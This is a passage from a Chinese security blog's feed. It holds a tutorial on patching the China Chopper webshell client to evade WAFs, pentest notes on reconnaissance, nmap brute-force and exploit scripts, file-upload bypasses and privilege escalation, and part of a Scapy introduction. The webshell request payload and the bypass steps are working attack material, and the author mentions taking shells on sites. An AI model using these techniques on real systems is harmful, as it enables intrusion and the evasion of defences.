t=threading.Thread(target=scan,args=(qc,))        t.start()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/x4A6ilJ.png" alt=""></p><p>转载请注明来自:422926799.github.io<br>欢迎加入即刻安全交流群：307283889</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass菜刀进化成过Waf刀</title>
      <link href="/posts/ec776b6d.html"/>
      <url>/posts/ec776b6d.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我要在这里大肆吐槽，今天的底层软件好像都在刁难我。首先是用UPX脱壳工具<br>把菜刀脱坏掉了，然后重新下一个。在换一个脱没毛病，用C32asm进行字符替换的时候不给我替换。我特么。。。后面还是用Hxdx64进行替换的，我也是醉了。</p><p><img src="https://i.imgur.com/rPw2ac5.jpg" alt=""></p><pre><code>正式进入贪婪之岛篇！</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><pre><code>bypass菜刀教程：https://github.com/admintony/BypassCaiDao</code></pre><p>首先你要有把2010年的菜刀，因为16年的菜刀的数据包不同，然后你还需要一些底层工具。</p><pre><code>2010菜刀：链接: https://pan.baidu.com/s/1jvECLJjpsh4OsclZFHkv8g 密码: 6n1h吾爱破解工具包：链接：https://pan.baidu.com/s/1nwJg0eX  密码: iuj3WSExplorer抓包工具：https://blog.mycike.com/154.html</code></pre><p>我们首先把菜刀的UPX壳给脱了，这里我就不说了。自己脱掉就行<br><img src="https://i.imgur.com/m4Tcb1Z.png" alt=""><br>脱壳：</p><p><img src="https://i.imgur.com/993lYUE.png" alt=""></p><p>然后我们启动WSExplorer抓包工具，选择菜刀想进程进行抓包（用菜刀连shell）<br><img src="https://i.imgur.com/FxN5FLd.png" alt=""><br>然后我们可以看到图上抓到的包</p><pre><code>x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7</code></pre><p>这里引用文章的解释：</p><pre><code>x 是shell的密码，其中的数据是让shell再接收一个z0z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.</code></pre><p>然后文章把User-Agent头也改了，这里我就不改了。因为我获取了文件偏移地址但不会转为内存偏移地址（手动滑稽）</p><p>我们直接修改第一个参数数据：<br>首先用C32asm搜索：@eval(base64_decode($<em>POST[z0])); 替换成Dizep,fewi:8chigshi,(cTSWX</em>~4a–?（我这里的C32asm刁难我）<br><img src="https://i.imgur.com/67Pzx2W.png" alt=""><br>用HxDx64来替换<br><img src="https://i.imgur.com/dvYLN4b.jpg" alt=""><br>然后找一个有waf的站来测试，就用我之前过安全狗文件上传的那个站吧<br><img src="https://i.imgur.com/801VXaI.png" alt=""><br>（如果用普通的刀和一句话连的话和上图一样）<br><img src="https://i.imgur.com/eqR09oE.png" alt=""><br>转载请注明转自：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试信息笔记</title>
      <link href="/posts/c6a4e558.html"/>
      <url>/posts/c6a4e558.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>暑假快过完了，剩下的日子也没有多少。假期也写了不少脚本还有一个<br>CMS_DEBUG的脚本没用写完。里面集合比较多的CMS漏洞插件，测试过<br>都能用的。假期也拿了10几个shelll，虽然都提不了权限（滑稽）<br>总结一下假期所学到的东西。<br><img src="https://i.imgur.com/cCcSqID.jpg" alt=""></p><pre><code>重要的日历缺了一部份，被遗忘的月份将会被盛大地吊唁。在身着丧服的乐团演奏之下，农历十一月的月亮安稳地运行着。菊花与叶片一同枯萎凋零，躺卧在沾血的火红之眼旁边。就算剩下的伙伴只有一半，你的优越地位依然屹立不倒。享受这幕间休息时间吧，去找新伙伴也行。出发时可往东去，一定会遇到等待你的人</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><strong>信息收集:</strong><br>是渗透测试的第一部分也是最重要的一部分。信息收集的大小决定挖出的漏洞，与漏洞的高危。<br><strong>一、web指纹与网站信息的收集：</strong></p><pre><code>爱站网进行SEO综合信息收集whatweb指纹收集 //whatweb -v 域名云悉进行CMS指纹识别判断网站是否有CDN,查询网站真实IPGoogle Hacking技巧nc抓网站指纹一些浏览器的插件可以识别web程序的指纹Zoomye与shodan进行搜索</code></pre><p><strong>二、路径探测与敏感信息泄露</strong></p><pre><code>敏感信息泄露/.robots.txt //通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。由于这样让我们知道了网站的一些敏感文件/.git //所有该项目的源代码,私有仓库的地址,私密的配置信息,所有commiter的邮箱帐号信息,(可能)内部的帐号和密码/.svn //所有该项目的源代码,svn仓库的地址,svn仓库所属用户的用户名/.hg //项目源代码,项目仓库地址,(可能)仓库的用户名,其他/.bzr //源代码,仓库地址,开发者的信息/.cvs //因为是纯客户端的工具, 所以只会泄露源代码备份文件泄露，如vim的/.swpWEB-INF目录泄露 //在Java的Servlet 文档中,说到WEB-INF目录&quot;包含了所有web应用会用到但是不处于web路径中的资源&quot;, 也就是说, WEB-INF目录下的内容是不属于公开页面的.web应用可以通过getResource等API在servlet的上下文中访问到这些资源.通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)配置文件泄露配置错误导致的泄露敏感的信息存在于源码之中 //通过F12浏览现在许多网站都会存放一些敏感信息，比如学校的教务处系统就会上传一些和学生信息，如果这些 word 文件没有设置好相关权限，在网上搜索就可以搜索到相关敏感录访问文件相关网址也可以访问到相关文档。所以包含以下几点注意信息： 每个文件和文件夹权限必须设置。 一些相关敏感文档要及时清理，防止泄露。或者不包含敏感信息。 防止浏览进行下载敏感文件后缀 .zip，.tar，.gz，.tgz，.rar，... :(压缩）归档文件 .java：没有理由提供对 Java 源文件的访问 .txt：文本文件 .pdf：PDF 文档 .doc，.rtf，.xls，.ppt，...：Office 文档 .bak，.old 和其他指示备份文件的扩展（例如：〜用于 Emacs 备份文件）更多信息，请查看链接: http://filext.com/路径探测与敏感信息泄露利用工具通过brupsuite的Spider功能进行爬虫dirb进行路径探测dirbuster一些其他自动化进行路径探测的工具nikto -h http://xxx.com</code></pre><p><strong>三、web服务枚举</strong></p><pre><code>whois信息收集DNS信息收集子域名查询旁站查询端口扫描C段扫描dns域传输漏洞网站敏感目录 网站泄露的目录 查看HTML有没有有用的注释收集管理员邮箱 网站后台 一些工具的用法(首先通过判断目标存在扫描服务用适当的脚本进行检测)：nmap命令：nmap -sV IP    nmap -p 1-65535 IPnmap -A IPnmap --script=vuln IPnmap --max-parallelism 800--script http-slowloris IP //检测http服务拒绝nmap -p 8080 --script http-iis-short-name-brute IP //IIS 短文件泄露nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 IP //ftp弱口令暴力破解nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=IP //验证http中开启的-methods 方法nmap -sV --script http-vuln-cve2015-1635 IP //验证HTTP.sys 远程代码执行nmap -sV -p 443 --version-light --script ssl-poodle IP //验证 SSL POODLE information leaknmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt IP //验证http 中开启了put 方法nmap --script mysql-empty-password IP //验证mysql 匿名访问nmap -v -v --script ssl-cert IP //验证ssl-cert证书问题nmap -Pn --script ssl-date IP //验证SSL证书的有限期nmap -p 443 --script ssl-known-key IP //验证 Debian OpenSSL keysnmap --script ssl-enum-ciphers IP //验证弱加密SSL套件nmap IP --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2 //验证多种SSL漏洞问题nmap --script sniffer-detect IP //在网络中检测某主机是否存在窃听他人流量nmap -sV --script unusual-port IP //精准地确认端口上运行的服务nmap --script brute IP //使用nmap 对常见的服务进行暴力破解nmap --script exploit IP //使用nmap 利用已知的漏洞入侵系统nmap --script external IP //使用nmap 进行利用第三方的数据库或资源进行信息收集或者攻击nmap --script fuzzer IP //使用nmap 进行模糊测试，发送异常的包到目标机，探测出潜在漏洞 nmap --script intrusive IP //使用nmap 进行入侵，此类脚本可能引发对方的IDS/IPS的记录或屏蔽nmap --script malware IP //使用nmap 探测目标机是否感染了病毒、开启了后门等信息nmap --script safe IP //使用nmap 对系统进行安全检查nmap --script nmap-vulners,vulscan --script-argsvulscandb=scipvuldb.csv -sV //CVE漏洞扫描 详细方法：http://www.freebuf.com/sectool/161664.html    dnsenum命令：dnsenum 域名查询子域名：AQUATONE 用法：http://www.freebuf.com/sectool/137806.html子域名挖掘神器：https://pan.baidu.com/s/1dFJzIJR旁站查询：用一些在线的工具进行查询，如站长助手与爱站网之类的御剑有旁站查询和C段扫描的功能的版本C段扫描：whatweb --no-errors --url-prefix https:// 192.168.0.0/24</code></pre><p><strong>四、明确web程序入口点</strong></p><pre><code>HTTP 请求（request）：明确代码中哪一块使用的是 GET 传输，哪一块是 POST 传输。明确所有 HTTP 请求全部使用 POST 传输。（包括一些隐藏的参数 hidden）明确所有传输是 GET 提交的时候，要做好标记。明确哪些是查询字符串参数（说明白就是输入、输出）即使做了编码或加密，也要注意参数，在应用中做了哪些调用。HTTP 回复（response）：明确 header 返回哪些参数查看哪些目录返回是以 200、300、403 以及 500 返回，做好标记，都把他们重定向首页，防止其它页上面泄露不必要信息。一些注意点如下：可以使用 BurpSuite 工具，去查看一些隐藏</code></pre><p>做完以上的内容之后，做一个总结。</p><p><strong>漏洞挖掘</strong>：<br>做完信息收集之后就到了漏洞挖掘这一步，挖掘漏洞看了挺多大牛的文章。这里<br>我也做了几点总结。</p><pre><code>在做完信息收集这一步后，想必已经知道了中间件的版本信息之类的。我们可以利用searchsploit来寻找中间件的漏洞。如果知道CMS版本去搜Google搜一下这个版本或者这个CMS的漏洞如：dede_cms的远程写入漏洞。表单尝试弱口令，表单尝试逻辑漏洞，模糊登录测试 工具：cewl [options] www.example.comBurpsuite自动化的漏洞挖掘：Burp Scanner    自动化扫描安全漏洞的Burp Suite工具HTTP 安全方法测试:HTTP 方法主要应用在 Web 服务器上面，通过部署一些应用可以查看到一些相关的方法。HT议，最超见的传输有 GET、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT 传输方法，而 GET 是在 URL 可见的，相对不安全，风险高。显示的参数，风险低。常见的 HTTP 方法有 GET其中一些方法可能会对 Web 应用程序造成安全风险，因为它们允许攻击者修改存储在 Web 在某些情况下窃取合法的证书用户。 更具体地操作，应该禁用的方法如下： PUT：该方法允许客户端上传 Web 服务器上的新文件。 攻击者可以利用它通过上传恶意用 cmd.exe 执行命令的 asp 文件）或者通过简单地使用受害者服务器作为文件存储。 DELETE：此方法允许客户端删除 Web 服务器上的文件。 攻击者可以利用它作为一种非破坏网站或发起 DoS 攻击。 CONNECT：此方法可以允许客户端将 Web 服务器用作代理。 TRACE：这个方法简单地返回给客户端，不管字符串是否发送给客户端服务器，主要用 黑盒测试通过抓包软件查看一下服务器支持哪些 HTTP 协议般会在传输的头部加 OPTIOHTTP 传输加密安全测试 :HTTP 传输安全性（HSTS）标头是网站必须通信的一种机制。浏览器必须通过 https 发送。应对安全的重要措施，首先是要验证网站是否正在使用这种安全措施 HTTP 标头，以确保器传输到服务器。HTTP 严格传输安全性（HSTS）功能允许 Web 应用程序通过浏览器通知浏览器使用特殊立到指定域的连接使用 HTTP 的服务器。 相反，它应该自动建立所有访问该网站的连接请TP 在浏览器是以明文传输，这样会泄露一些重要信息，使用 https 加密传输，首先会符合过程中也会进行加密，防止信息在传输过程中泄密。HTTP 传输 header 严格按照两个指 max-age：浏览器应该自动从 HTTP 转换到 HTTPS 协议。 includeSubDomains：指示所有 Web 应用程序的子域名必须使用 HTTPS展示一个 HSTS 头实现的例子ict-Transport-Security: max-age=60000; includeSubDomains须检查 Web 应用程序使用上述 header，并查找是否可能产生以下安全问题：攻击者嗅探网络流量并访问通过未加密通道传输的Cross Domain 策略测试:RIA 是基于 Web 的服务，可以在浏览器去执行一些操作，和桌（例如 Java，Adobe Flash，Adobe）可以访问不同区域的数据。 对的 crossdomain.xml，并另外创建了它自己的跨域策略文件：clie跨域的时候，它都会首先查找目标域中的策略文件，用于确定是是允许的。主策略文件位于域的根目录。 客户端可能会被指示加载不同的主策略文件允许所请求的策略文件。 如何测试在 Web 的根目录去查找这两个文件，查看是否可以访问，clientaccesspolicy.xm角色定义测试 : 测试目标管理员的角色应该和其它应用角色分配清楚，管理员权限应该只设定管理人员管理，而应用管理的权限只能用来管理应用即可，两者不能混淆。 如何测试我们利用管理员的账号通抓包去修改一些相应的参数，查看是否可以看到应用管理员的一些相关信息。 现在，我有很多 WordPress 的网站，WordPress 的角色定义的例子可以在下面显示的链接中找到。 https://codex.wordpress.org/Roles_and_Capabilities 安全测试工具 BurpSuite 手工测试使用普通用户登录，在查看用户的同时，BRUP 已经把页面扫描了一遍，不仅可以查看面目，也可以进行扫描工具。BurpSuite 是一个非常强大的工具用户注册安全测试:测试目标验证用户注册的身份要求是否与业务和安全性保持一致验证一下用户注册过程如何测试测试列表 确定谁可以注册访问（任何人）？ 注册是否在供应之前由人工审查，或者如果注册是自动授予的 该标准得到满足。 同一个人是否可以多次注册？ 用户可以注册不同的角色或权限吗？ 注册成功需要什么样的身份证明？ 是否验证了注册身份？ 身份信息是否容易伪造或伪造？ 在注册过程中可以交换身份信息吗？测试工具 Manual test HTTP proxy (Burp Suite, ZA用户账户权限测试: 目标测试验证低权限用户是否可以去查看高权限用户的信息，或者低权限用户可以修改高用户的资料。 如何测试测试项 是否有一些验证，审核和授权的配置请求？ 是否有一些验证，审核和批准取消请求？ 管理员可以查看其它管理员信息吗，所谓平行越权？ 管理员或其他用户可以查看上级的用户信息吗？ 管理员或用户是否可以自行解除配置？权限配置是否可以删除一些个人信息，如果设置禁用，用户是否通过其它途径 利用工具：名称    描述Compare Site Maps    Burp的用于测试授权的模块这里有个小技巧，就是注册两个不同权限的用户，然后用高权限的用户去访问整个Web应用，退出高权限用户，登录低权限用户,然后用Burp的Compare Site Maps工具去测试哪些页面的权限控制没有做好。账户枚举和用户帐户猜解测试: 黑盒测试一般情况下，测试人员对目标的用户设施一点都不知道，也没有进行信息地显示一些用于枚举用户的信息。 HTTP 响应信息 测试正确的用户名和错误,看看是否会返回一些逻辑上的问题。如用户正确密码错误则返回密码错误，从找登陆，注册，回密码进行测试看看是否能发现用户一些敏感信息。HTTP 数据传输认证测试：看看是否有未加密的信息在传输或者使用GET请求HTTP 默认认证测试：测试一些有共同测试点的信息 测试一些默认的用户：admin, administrator, root, system, guest, operator, superuser。在源代码里面查看是否有一些注释写着用户名和，检查一下配置文件，里面会涉及到用户名和密码，暴力破解锁定测试：简述户锁定机制用于缓解暴力密码猜测攻击。 通常在 3 到 5 次间段后，通过自助服务解锁机制或管理员干设置才能解锁。 止用户被拒绝授权访问之间取得平衡。目标对象评估帐户锁定机制减轻暴力密码猜测的能力评估解锁机制对未授权帐户解锁的绕过认证协议测试：当应用程序根据固定值参数验证成功登录时用户可以修改这些参数可以访问而无需提供有效的sql注入测试：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试与手测，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入强制浏览如果： Web 应用程序仅在登录页面上实现访问控制，则可以绕过认证架绕过 SESSION 管理协议测试:主要攻击步骤如下： Cookies 收集：收集充足数量的 cookies 样本。 Cookie 逆向工程：分析 cookie 的生成算法。 Cookie 篡改：伪造一个有效的 cookie 来执行攻击。最后一步可能要求 大量的尝试，取决于 cookie 是如何被创造的(cookie 暴力破解攻COOKIE 会话漏洞测试： 测试 cookie 属性漏洞。通过使用一个拦截代理或者拦截浏览器插件，捕捉应用程序设置 cookie 值(set-cookie)的所有的响应包,并且检查下列内容： Secure 字段属性：当一个 cookie 包含了敏感信息或者一个 session token 时，这个 cookie 应该通过加密通道进行传输。举个例子：当登陆进一个应用并且使用 cookie 设置会话令牌(session token)后，应该使用“;secure”标志验证它是否被打上标记。如果 secure 没有被打上标记，浏览器会同意使用未加密的渠道来传递cookie 值：例如通过 http 协议。因此，攻击者可以诱导用户通过不安全的隧道提交他们的 cookie 值，从而导致信息的泄露。 HttpOnly 字段属性：这个属性应该一直被设置，即使并不是所有的浏览器都支持这个属性。这个属性可以避免 cookie 值被用户端脚本获得。这个属性无法消除跨站脚本攻击但是能消除一些危险的攻击。所以，记得检查是否 httpOnly 标签被设置了。 domain 字段属性：验证域名是否设置的太宽松。这个属性只应该为需要接收 cookie 的服务器设置。举个例子，如果应用驻留在服务器 app.mysite.com 上，那么 domain 属性应该为&quot;domain=app.mysite.com&quot;而不是“domain=.mysite.com&quot;. 因为后者可能会允许潜在的易受攻击的服务器接收到 cookie 值。 Path 字段属性： 认证路径属性，就像 domain 属性所介绍的一样，不能被设置的太过松散。即使 domain字段属性已经被设置的尽可能的安全紧凑，如果 path 属性被设置在根目录’/’下，其他一些运行在同一个服务器下的不安全的应用也可能会受到攻击。举个例子：如果一个应用运行在/myapp/目录下，其 cookie路径应该设置为“;path = /myapp/“而不是”;path= /”或“;path= /myapp”。注意到”/”应该紧跟在 myapp 的后面。如果不这样设置，浏览器将会发送 cookie 值给任何包含了”myapp” 例如”myapp-exploited”的路径。 Expires 字段属性：如果将此属性设置为将来的某个时间，则到期后该 cookie 值会失效。举个例子：如果一个 cookie 设置&quot;; expires=Sun, 31-Jul-2019 13:45:29 GMT&quot;而当前时间为 July 31st 2018，那么测试者就应该检查这个 cookie 值。如果这个 cookie 值是一个存储在用户硬盘中的会话令牌（session token），那么能访问这个 cookie 的攻击者或者本地的用户（例如 admin 用户）就能通过重新提交这个 token 值访问这个应用，直到这个 cookie 过期SESSION 固定攻击测试：当服务器端完成一次成功的用户认证后，如果一个应用不刷新用户的 session cookie 值，就有可能存在 SESSION定攻击漏洞。在这种情况下，攻击者可以迫使一个用户使用一个攻击者已知的cookie值，从而窃取用户的Session，现 session 劫持。ion 固定攻击漏洞发生的场景：一个 web 应用程序通过继续使用与用户关联的会话 ID 对用户进行身份验证，而不会首先使现存的会话 ID 无效。一个攻击者能够强制用户使用已知的会话 ID，以便在用户进行身份验证后，攻击者能够访问经过身份验证的会话。SQL注入：注意网站的URL有id=?都拿到SQLMAP测试一遍或者手测，表单进行单和双引号进行测试，用burpsuite抓表单提交的包扔SQLMAP跑，网站有调用数据库的地方都测试一遍，API接口测试SQL注入文件上传：能上传文件的地方就尝试进行挖掘。遇到拦截先看看服务器用什么配置的环境。例如是IIS6.0（IIS环境大部分都有文件上传漏洞可以百度发现）或Apache等等。。都可以百度看看有什么上传绕过。一般绕过方式为：后缀大小写绕过，文件类型绕过，双写后缀名绕过，请求特殊后缀绕过，图片木马合并上传，文件00截断绕过，截断攻击%和&amp;，web服务器环境配置寻找漏洞  例如：IIS6.0的解析漏洞1）前端JavaScript验证 （发现有只前端验证的话，手动写一个文件上传的html将action设置为判断文件即可。）例如：检测上传文件的是：upload.php 但是服务端没做判断，前端做了判断。&lt;form action=’http://xx/upload.php’ method=’post’&gt;&lt;input type=’file’ name=’file’ id=’file’&gt;&lt;br&gt;&lt;input type=’submit’ value=’提交’&gt;&lt;/form&gt;文件包含：注意url后面有include=xx.php,或tiao=xx.php，file=xxx.php，总之注意一下url。先判断远程包含或本地包含，可以远程包含直接Getshell即可。本地包含可以利用各种伪协议例如：php,data,zip等等。。或与文件上传漏洞一起利用。详细的利用手法：https://www.cnblogs.com/haq5201314/p/9248281.htmlnginx文件解析漏洞：找到一张图片后面加上/.php。如果返回乱码则出现该漏洞xss：利用web程序，插入了恶意javascript代码就是xss。xss分为三种：反射型xss，存储型xss，DOM型xss。在能输入的地方插入xss payload代码进行测试xml注入（XXE）：当Web应用的XML解析器没有正确的验证攻击者传入的XML文档，就会发生XML注入。 xml注入漏洞：https://www.cnblogs.com/xiaozi/p/5785165.html模板注入：模板注入就是攻击者利用模板的语法注入恶意代码。教程：http://www.cnblogs.com/wfzWebSecuity/p/9415641.html命令注入：用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。 教程：https://www.cnblogs.com/enderzhou/p/6836678.html恶意重定向：当应用没有对用户输入的URL进行检查就造成了恶意重定向。测试方法：对一些请求名加入URL看看是否会跳转</code></pre><p><strong>一些后渗透的学习：</strong><br>前面也说了，拿到了shell嘛虽然处于提不了权的尴尬地位。但是还是有一些学习滴（滑稽智商产出99+）</p><p>windows方面的提权用到的命令（这里懒得打命令，直接放url（滑稽x3））：</p><pre><code>有关windows提权说明：http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html假期写的windows提权辅助脚本：https://github.com/422926799/python/blob/master/windows_collect.py</code></pre><p>Linux方面提权用到的命令：</p><pre><code>利用Linux的path环境进行提权https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&amp;mid=2651149779&amp;idx=1&amp;sn=cfb63bb2ac725e017c619a449e6a53ee&amp;chksm=8c214e49bb56c75f7a6b41da63f4fdf7c8ee5269fce11e82cf853342af03a9ff72c862e1764c&amp;mpshare=1&amp;scene=23&amp;srcid=0712tJEadbXElVmSvoLVgkAE#rd从NTDS.dit获取密码hash的三种方法http://www.freebuf.com/sectool/176876.htmlLinux提权：https://guif.re/linuxeop假期写的Linux提权赋值脚本：https://github.com/422926799/python/blob/master/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/informationgathering.py</code></pre><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>现实中提权并不可能那么顺利，那么就要靠大家搜索一些奇淫技巧了。到时候我会写的。就在刚刚手贱把下了6.5GMac镜像删除了。。。。<br>(如果要学习好渗透的话，自己所画的学习图是不可少的)<br>例如:<br><img src="https://i.imgur.com/Tzw5jOh.png" alt=""></p><p>好了，这里就到此为止。转载请注明：422926799.github.io 九世的博客<br>欢迎加入即刻安全技术交流群：307283889</p><pre><code>重要的记忆缺少了一个人，在梦中你的出现，勾勒起遗忘的过去......</code></pre>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scapy的认识</title>
      <link href="/posts/9f93464c.html"/>
      <url>/posts/9f93464c.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送它们，捕获它们，匹配请求和回复等等。它可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现（它可以取代hping，85％的nmap，arpspoof，arp-sk，arping，tcpdump，tethereal，p0f等）。它还能在许多其他工具无法处理的其他特定任务中表现良好，例如发送无效帧，注入自己的802.11帧，组合技术（VLAN跳跃+ ARP缓存中毒，WEP加密通道上的VOIP解码，…… ）等</p><p><img src="https://i.imgur.com/PhZuxdD.jpg" alt=""></p><h2 id="scapy的基础使用"><a href="#scapy的基础使用" class="headerlink" title="scapy的基础使用"></a>scapy的基础使用</h2><p>scapy的安装方法：</p><pre><code>Linux安装方法：sudo apt-get install scapypip install scapywindows的安装方法：pip install scapyMac的安装方法：pip install scapy</code></pre><p>安装完成之后在终端执行sudo scapy可以见到如下图：<br><img src="https://i.imgur.com/UdSxoff.png" alt=""><br>(当然那个banner也有可能没有出现)<br>框架包的引入</p><pre><code>from scapy.all import *</code></pre><p>查看配置信息：</p><pre><code>from scapy.all import *printf(conf)</code></pre><p><img src="https://i.imgur.com/zsWHhuY.png" alt=""><br>配置信息：</p><pre><code>ASN1_default_codec = &lt;ASN1Codec BER[1]&gt;AS_resolver = &lt;scapy.as_resolvers.AS_resolver_multi object at 0x7fae78a43b70&gt;BTsocket   = &lt;BluetoothRFCommSocket: read/write packets on a connected L2CAP...L2listen   = &lt;L2ListenSocket: read packets at layer 2 using Linux PF_PACKET ...L2socket   = &lt;L2Socket: read/write packets at layer 2 using Linux PF_PACKET ...L3socket   = &lt;L3PacketSocket: read/write packets at layer 3 using Linux PF_P...auto_crop_tables = Trueauto_fragment = 1cache_iflist = {}cache_ipaddrs = {}checkIPID  = 0checkIPaddr = 1checkIPinIP = TruecheckIPsrc = 1check_TCPerror_seqack = 0color_theme = &lt;NoTheme&gt;commands   = IPID_count : Identify IP id values classes in a list of packets...contribs   = {}crypto_valid = Falsecrypto_valid_advanced = Falsedebug_dissector = 0debug_match = 0debug_tls  = 0default_l2 = &lt;class &apos;scapy.packet.Raw&apos;&gt;emph       = &lt;Emphasize []&gt;ethertypes = &lt;/etc/ethertypes/ n_802_AD n_802_1AE&gt;except_filter = &apos;&apos;extensions_paths = &apos;.&apos;fancy_prompt = Truegeoip_city = Nonehistfile   = &apos;/home/nineworld/.scapy_history&apos;iface      = &apos;ens33&apos;iface6     = &apos;lo&apos;interactive = Falseinteractive_shell = &apos;&apos;ipv6_enabled = Truel2types    = 0x0 -&gt; Loopback (Loopback) 0x1 &lt;- Dot3 (802.3) 0x1 &lt;-&gt; Ether (E...l3types    = 0x3 -&gt; IP (IP) 0x800 &lt;-&gt; IP (IP) 0x806 &lt;-&gt; ARP (ARP) 0x86dd &lt;-&gt;...layers     = Packet : &lt;member &apos;name&apos; of &apos;Packet&apos; objects&gt; NoPayload : &lt;membe...load_layers = [&apos;l2&apos;, &apos;inet&apos;, &apos;dhcp&apos;, &apos;dns&apos;, &apos;dot11&apos;, &apos;gprs&apos;, &apos;hsrp&apos;, &apos;inet6&apos;...logLevel   = 30manufdb    = &lt;00:50:C2:AF:C0:00/36 OdusTech, Odus Technologies SA&gt; &lt;00:50:C2...mib        = &lt;MIB/ prime192v2 EV_T_Telessec_GlobalRoot_Class_3 pkcs_9_sx bas...min_pkt_size = 60neighbor   = Ether -&gt; IPv6 Ether -&gt; LLC Ether -&gt; ARP Dot3 -&gt; LLC Ether -&gt; Do...netcache   = arp_cache: 0 valid items. Timeout=120s in6_neighbor: 0 valid it...noenum     = &lt;Resolve []&gt;padding    = 1padding_layer = &lt;class &apos;scapy.packet.Padding&apos;&gt;prog       = display = &apos;display&apos; dot = &apos;dot&apos; hexedit = &apos;hexer&apos; ifconfig = &apos;i...promisc    = 1prompt     = &apos;&gt;&gt;&gt; &apos;protocols  = &lt;/etc/protocols/ dccp rohc ospf eigrp xns_idp ax_25 rspf ipip i...raw_layer  = &lt;class &apos;scapy.packet.Raw&apos;&gt;raw_summary = Falseresolve    = &lt;Resolve []&gt;route      = Network Netmask Gateway Iface Output IP Metric 0.0.0.0 0.0.0.0 ...route6     = Destination Next Hop Iface Src candidates Metric fe80::/64 :: e...services_tcp = &lt;/etc/services-tcp/ fax remoteping cvspserver sane_port sge_q...services_udp = &lt;/etc/services-udp/ sge_qmaster venus imap2 gopher omirr rtsp...session    = &apos;&apos;sniff_promisc = 1stats_classic_protocols = [&lt;class &apos;scapy.layers.inet.TCP&apos;&gt;, &lt;class &apos;scapy.la...stats_dot11_protocols = [&lt;class &apos;scapy.layers.inet.TCP&apos;&gt;, &lt;class &apos;scapy.laye...stealth    = &apos;not implemented&apos;temp_files = []teredoPrefix = &apos;2001::&apos;teredoServerPort = 3544use_bpf    = Falseuse_dnet   = Falseuse_npcap  = Falseuse_pcap   = Falseuse_pypy   = Falseuse_winpcapy = Falseverb       = 2version    = &apos;2.4.0&apos;warning_threshold = 5wepkey     = &apos;&apos;</code></pre><p>查看scapy支持的协议</p><pre><code>from scapy.all import *print(ls())</code></pre><p><img src="https://i.imgur.com/TxOYQXi.png" alt=""></p><pre><code>AH         : AHARP        : ARPASN1P_INTEGER : NoneASN1P_OID  : NoneASN1P_PRIVSEQ : NoneASN1_Packet : NoneATT_Error_Response : Error ResponseATT_Exchange_MTU_Request : Exchange MTU RequestATT_Exchange_MTU_Response : Exchange MTU ResponseATT_Find_By_Type_Value_Request : Find By Type Value RequestATT_Find_By_Type_Value_Response : Find By Type Value ResponseATT_Find_Information_Request : Find Information RequestATT_Find_Information_Response : Find Information ReponseATT_Handle_Value_Notification : Handle Value NotificationATT_Hdr    : ATT headerATT_Read_By_Group_Type_Request : Read By Group Type RequestATT_Read_By_Group_Type_Response : Read By Group Type ResponseATT_Read_By_Type_Request : Read By Type RequestATT_Read_By_Type_Request_128bit : Read By Type RequestATT_Read_By_Type_Response : Read By Type ResponseATT_Read_Request : Read RequestATT_Read_Response : Read ResponseATT_Write_Command : Write RequestATT_Write_Request : Write RequestATT_Write_Response : Write ResponseBOOTP      : BOOTPCookedLinux : cooked linuxDHCP       : DHCP 